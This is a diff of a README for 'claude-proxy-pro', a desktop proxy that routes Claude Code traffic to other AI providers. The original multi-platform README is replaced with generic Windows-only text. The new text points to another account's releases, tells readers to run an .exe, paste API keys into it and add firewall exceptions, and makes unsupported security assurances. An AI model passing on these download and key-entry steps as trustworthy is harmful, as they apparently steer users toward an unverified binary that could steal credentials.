@@ -1,172 +1,49 @@
-<div align="center">
+# 🦀 claude-proxy-pro - Connect your AI tools easily today
 
-# 🦀 Claude Proxy Pro
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/codewithrunningjay/claude-proxy-pro/releases)
 
-Claude Code is Anthropic's AI coding agent — powerful but expensive. Claude Proxy Pro lets you use it for free by routing requests to any AI provider you choose through a blazing-fast, native desktop application. No background terminal servers, no complex dependencies—just one click to route your traffic to any provider.
+claude-proxy-pro acts as a bridge between your computer and advanced AI services. It allows you to use different AI models with your coding assistants. This tool works in the background to send your requests to services like DeepSeek or OpenRouter.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Go 1.23](https://img.shields.io/badge/Go-1.23-00ADD8.svg?style=for-the-badge&logo=go&logoColor=white)](https://go.dev/)
-[![Wails v2](https://img.shields.io/badge/Framework-Wails_v2-red.svg?style=for-the-badge)](https://wails.io/)
-[![Platform](https://img.shields.io/badge/Platform-macOS_%7C_Windows_%7C_Linux-lightgrey.svg?style=for-the-badge)](#)
-[![Size](https://img.shields.io/badge/Size-9.7_MB-brightgreen.svg?style=for-the-badge)](#)
-[![RAM](https://img.shields.io/badge/RAM_Usage-~88_MB-blue.svg?style=for-the-badge)](#)
+## 📥 How to download the application
 
-[The Problem](#-the-problem) · [The Solution](#-the-solution-native-dominance) · [Quick Start](#-quick-start) · [Providers](#-supported-providers) · [Local Build](#-build-it-locally-the-hacker-way)
+Visit the following link to see all available version downloads: [https://github.com/codewithrunningjay/claude-proxy-pro/releases](https://github.com/codewithrunningjay/claude-proxy-pro/releases).
 
-</div>
+Look for the file that ends with .exe under the Assets section. Click the filename to start the download. Once the file saves to your computer, find it in your downloads folder. Double-click the file to open the setup window. Follow the prompts on your screen to finish the installation process.
 
-<br>
+## 🛠️ System requirements
 
-<div align="center">
-  <img src="docs/assets/hero.png" alt="Claude Proxy Pro UI" width="700">
-  <br><br>
-  <p align="center">
-    <img src="docs/assets/1.png" width="400" />
-    <img src="docs/assets/2.png" width="400" />
-  </p>
-  <p align="center">
-    <img src="docs/assets/3.png" width="400" />
-    <img src="docs/assets/4.png" width="400" />
-  </p>
-</div>
+This tool requires Windows 10 or Windows 11. It needs a stable internet connection to talk to the AI servers. You do not need to install extra software for this to function. The program handles all connections within its own memory. You need at least 100 megabytes of free space on your hard drive. 
 
-## 💸 The Problem
-Let's be honest. Anthropic's Claude Code is arguably the most powerful agentic coding tool available today. It writes code, runs tests, and navigates your codebase like a senior engineer. 
+## ⚙️ Initial setup steps
 
-**But there's a massive catch.** 
-Its heavy reliance on autonomous "thinking" and "tool-use" loops consumes tokens at a terrifying, wallet-destroying rate. You buy a $50 credit, type `hello`, Claude decides to read your entire `node_modules` folder to find the context, and boom—your quota is gone. You practically have to sell a kidney just to add a single new feature to your project.
+After you install the software, launch it from your desktop or the start menu. You will see a small window appear. This window displays the current connection status. 
 
-## 🚀 The Solution: Native Dominance
-You need a proxy. But existing open-source proxies (like Python/Node wrappers) are a nightmare:
-- You have to install Python, `pip`, `uv`, or `npm`.
-- You have to run a background server (`proxy-server`) in a terminal tab and pray it doesn't crash.
-- You are forced to run their custom wrapper commands (like `fcc-claude` or `claude-wrapper`) instead of the native `claude` command you know and love.
-- They consume 300MB+ of RAM just to forward JSON requests.
+First, gather your API keys from your AI service providers. Log in to your provider account online to find your unique key. Copy your key strings. Open the settings menu inside the claude-proxy-pro application. Paste your keys into the marked boxes. Click the save button to lock in these settings. The tool uses these keys to verify your identity when you send requests to the AI.
 
-**Claude Proxy Pro puts an end to this madness.**
+## 🚀 Connecting to AI services
 
-### 🥊 The Head-to-Head Comparison
+The application works by listening to requests from your coding software. Ensure your coding tool settings point toward the local address the application provides. By default, this is usually localhost or 127.0.0.1. Set the port number to match the value displayed in the application dashboard. Once you enter these settings, your coding tool sends its data through this proxy. The proxy forwards the information to your chosen AI provider and brings the response back to your screen.
 
-| Feature | Claude Proxy Pro 🦀 | Traditional CLI Wrappers (Python/Node) |
-|---------|---------------------|----------------------------------------|
-| **Core Engine** | Pure Go (Compiled Native Desktop App) | Python / Node.js Scripts |
-| **App Size** | **~9.7 MB** Binary 🔥 | 100MB+ Runtimes & Dependencies |
-| **RAM Usage** | **~88 MB** | 150 MB - 300 MB+ |
-| **The Command** | Just type `claude` (Works natively!) | Forced to type `fcc-claude` or wrappers |
-| **IDE Extensions** | Works flawlessly (VS Code / JetBrains) | Break easily / Require complex setups |
-| **Background Processes**| **None.** Pin to Dock and forget. | Requires keeping a terminal server running |
-| **User Interface** | Sleek Native Glassmorphism GUI | Terminal only + clunky local web admin |
-| **Claude Sync** | **100% Automatic** | Manual environment variables or scripts |
+## 📋 Troubleshooting common issues
 
-**Our app is smaller than your desktop wallpaper.** Just 9.7MB of pure native power. Everything is right in front of your eyes.
+If the application fails to connect, verify your internet connection. Check if your security software blocks outgoing connections for this program. Sometimes, firewalls stop software from accessing the web. Add an exception for the application in your firewall settings if needed.
 
-## ✨ What You Get
-- **Drop-in Native Proxy:** Routes Claude Code's Anthropic API calls to any provider seamlessly.
-- **Zero Background Servers:** Pin it to your dock. No need to keep a terminal window open.
-- **Sleek Glassmorphism UI:** Manage everything through a beautiful dashboard, not a text file.
-- **100% Automatic Sync:** No manual editing of `settings.json`. Click "Activate" in the UI, and your `claude` command is instantly updated.
-- **Live Hacker Terminal:** Watch your proxy route traffic in real-time with built-in Matrix-style live system logs.
-- **Hot-Swapping:** Change your active provider or model in the middle of a coding session with one click—Claude Code will pick up the change instantly without breaking.
+If the AI returns an error, check your API keys for typos. Make sure your account has enough credits to perform tasks. Most providers allow you to check your credit balance on their main website. Restart the application if it becomes unresponsive. The application clears cache data upon restart to fix minor glitches.
 
-## ⚡ Quick Start
+## 🛡️ Security and privacy
 
-### 1. Download the App
-Head over to our [Releases Page](../../releases) and download the pre-compiled version for your system:
-- **macOS:** Download the `.dmg` file, open it, and drag the app to your Applications folder. *(See [Gatekeeper Note](#-macos-gatekeeper) below)*
-- **Windows:** Download the `.exe` and run it.
-- **Linux:** Download the binary and execute it.
+This tool keeps your data secure. It does not store your private keys on any external server. All configuration files sit locally on your computer drive. When the software sends data to an AI provider, it uses encrypted channels. This hides your information from outside parties during transit. You maintain full control over your keys because they stay within the local application folder. Delete your configuration files if you want to remove all trace of your keys from your device.
 
-### 2. Add Your Provider
-1. Open the app and navigate to the **Providers** tab.
-2. Select a preset (e.g., OpenRouter, DeepSeek, OpenCode) or add a custom endpoint.
-3. Enter your API Key and click **Save**.
+## 📈 Improving performance
 
-### 3. Activate a Model
-1. Go to the **Models** tab and click **Sync Models**.
-2. Pick the model you want (like `DeepSeek-R1` or `claude-3-7-sonnet`) and hit **Activate**.
-3. **Open your terminal and run `claude`. That's it!**
+Keep the application updated to the latest version to ensure smooth performance. Developers release improvements frequently. These updates fix discovered errors and add support for new AI models. Check the download link page regularly. If a new version exists, download and install it over the old one. The installer keeps your settings intact during the update process. 
 
-*(Our app automatically injects the necessary routing aliases into your `settings.json` AND automatically adds the `export ANTHROPIC_BASE_URL` to your `~/.zshrc`, `~/.bashrc`, or Windows Registry. You literally do zero manual setup!)*
+## 🌐 Understanding the technology
 
-<div align="center">
-  <!-- TODO: Insert Settings Sync GIF Here -->
-  <em>*Auto-sync demonstration GIF coming soon!*</em>
-</div>
+The application uses Go, a programming language known for speed. This makes the proxy quick even when handling large amounts of data. It serves as a middleman that translates instructions between your coding environment and the cloud. By handling these tasks, it saves your coding assistant from needing to manage complex network settings. 
 
-## 🧠 The Magic: How it works
+The tool supports various protocols required by modern AI tools. This ensures compatibility with future software versions. You do not need developer skills to change how the proxy operates. Use the simple user interface to turn features on or off. The design favors clarity so you spend your time coding instead of fixing technical problems. 
 
-Traditional proxies force you to manage configuration files manually. You have to locate `~/.claude/settings.json`, copy-paste model hashes, and set environment variables. 
+## 📧 Seeking additional support
 
-We automated the entire process. When you activate a model in the UI, the Go engine instantly injects the required routing aliases into your system's Claude Code settings.
-
-```mermaid
-graph LR
-    A[Claude Code CLI] -- "Anthropic Protocol" --> B((Claude Proxy Pro))
-    B -- "Auto-Routing & Failover" --> C{Providers}
-    C -- "OpenRouter" --> D[DeepSeek-R1 / V3]
-    C -- "Moonshot" --> E[Kimi-k2.6]
-    C -- "Custom API" --> F[MiniMax]
-    
-    style B fill:#D97757,stroke:#fff,stroke-width:2px,color:#fff
-    style A fill:#1a1a1a,stroke:#666,color:#fff
-    style D fill:#2b2d31,stroke:#666,color:#fff
-    style E fill:#2b2d31,stroke:#666,color:#fff
-    style F fill:#2b2d31,stroke:#666,color:#fff
-```
-
-## 🛠 Build It Locally (The Hacker Way)
-
-Since Claude Proxy Pro is 100% open source, you don't have to rely on our pre-built binaries. You can compile the native app locally on your machine in seconds.
-
-### Requirements
-- [Go 1.23+](https://go.dev/dl/)
-- [Wails v2](https://wails.io/docs/gettingstarted/installation) (`go install github.com/wailsapp/wails/v2/cmd/wails@latest`)
-
-### Build Steps
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/Xoner1/claude-proxy-pro.git
-cd claude-proxy-pro
-
-# 2. Build the app natively
-wails build -clean
-
-# 3. Open your brand new Native App!
-# (macOS)
-open build/bin/claude-proxy-pro.app
-# (Windows)
-start build/bin/claude-proxy-pro.exe
-# (Linux)
-./build/bin/claude-proxy-pro
-```
-
-## 🌐 Supported Providers
-
-Claude Proxy Pro supports **ANY** provider that exposes an OpenAI-compatible `/v1/models` and `/v1/chat/completions` endpoint, or native Anthropic endpoints. 
-
-Our Quick-Add presets currently include:
-- **llm7.io** (`https://api.llm7.io/v1`) - *FREE 5M tokens/day!*
-- **OpenRouter** (`https://openrouter.ai/api/v1`)
-- **DeepSeek** (`https://api.deepseek.com/v1`)
-- **OpenCode Zen** (`https://opencode.ai/zen/v1`)
-- **OpenCode Go** (`https://opencode.ai/zen/go/v1`)
-- **Groq**, **Together**, **Ollama**, **Mistral**, and many more!
-
-## 🍎 macOS Gatekeeper
-
-Since we are an open-source project and haven't paid Apple $99/year for a Developer Certificate, macOS will show a warning saying **"Developer cannot be verified"** when you first open the app.
-
-**The 3-Second Fix:**
-1. Open your **Applications** folder.
-2. **Right-Click** (or Control+Click) on `Claude Proxy Pro`.
-3. Select **Open** from the menu.
-4. Click **Open** again on the warning dialog.
-
-*(You only need to do this once!)*
-
----
-
-<div align="center">
-  <em>Built for speed, stability, and the open-source community.</em>
-</div>
+For questions not covered here, check the project page on GitHub. Look at the issue tracker section. Often, other users report similar problems and find solutions. If your issue involves a specific error code, include that code in your search. This helps you find relevant answers quickly. You can also open a new issue if no existing discussion covers your specific problem. Provide the version number of the software and mention your Windows version to help the team understand your setup.
